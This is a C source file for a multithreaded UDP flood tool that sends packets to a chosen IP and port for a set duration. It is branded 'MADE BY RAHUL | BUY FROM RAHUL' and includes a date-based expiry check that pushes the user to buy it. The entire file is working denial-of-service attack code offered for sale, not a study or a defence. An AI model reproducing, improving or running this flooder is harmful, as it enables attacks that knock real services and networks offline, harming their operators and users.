#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define THREAD_COUNT 200
#define PAYLOAD_SIZE 128
#define EXPIRY_DATE "2025-06-01"

char *target_ip;
int target_port;
int duration;
volatile int packets_sent = 0;

// === Generate random payload ===
void generate_random_payload(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = 'A' + rand() % 26;
    }
}

// === Check system date vs expiry date ===
int is_expired() {
    char date_str[11]; // YYYY-MM-DD
    FILE *fp = popen("date +%F", "r");
    if (!fp) return 1;
    fgets(date_str, sizeof(date_str), fp);
    pclose(fp);
    date_str[strcspn(date_str, "\n")] = 0;
    return strcmp(date_str, EXPIRY_DATE) > 0;
}

// === Packet sending thread ===
void *attack(void *arg) {
    time_t end_time = time(NULL) + duration;
    char payload[PAYLOAD_SIZE];

    while (time(NULL) < end_time) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

        generate_random_payload(payload, PAYLOAD_SIZE);
        sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        __sync_fetch_and_add(&packets_sent, 1);

        close(sock);
        usleep(10000);
    }
    return NULL;
}

// === Realtime monitor thread ===
void *monitor(void *arg) {
    int prev = 0;
    for (int i = 0; i < duration; i++) {
        sleep(1);
        int now = packets_sent;
        printf("📡 Packets/sec: %d\n", now - prev);
        prev = now;
    }
    return NULL;
}

// === Fancy banner ===
void print_banner() {
    printf("\n");
    printf("██████╗  █████╗ ██╗  ██╗██╗   ██╗██╗     \n");
    printf("██╔══██╗██╔══██╗██║ ██╔╝██║   ██║██║     \n");
    printf("██████╔╝███████║█████╔╝ ██║   ██║██║     \n");
    printf("██╔═══╝ ██╔══██║██╔═██╗ ██║   ██║██║     \n");
    printf("██║     ██║  ██║██║  ██╗╚██████╔╝███████╗\n");
    printf("╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝\n");
    printf("📢 MADE BY RAHUL | 💰 BUY FROM RAHUL\n\n");
}

// === Main function ===
int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <ip> <port> <duration>\n", argv[0]);
        return 1;
    }

    if (is_expired()) {
        printf("❌ This tool has expired. 💰 BUY FROM RAHUL for full access.\n");
        return 1;
    }

    print_banner();

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);

    srand(time(NULL));

    pthread_t threads[THREAD_COUNT], monitor_thread;

    pthread_create(&monitor_thread, NULL, monitor, NULL);

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, attack, NULL);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_join(monitor_thread, NULL);

    printf("\n✅ Done. Total packets sent: %d\n", packets_sent);
    return 0;
}
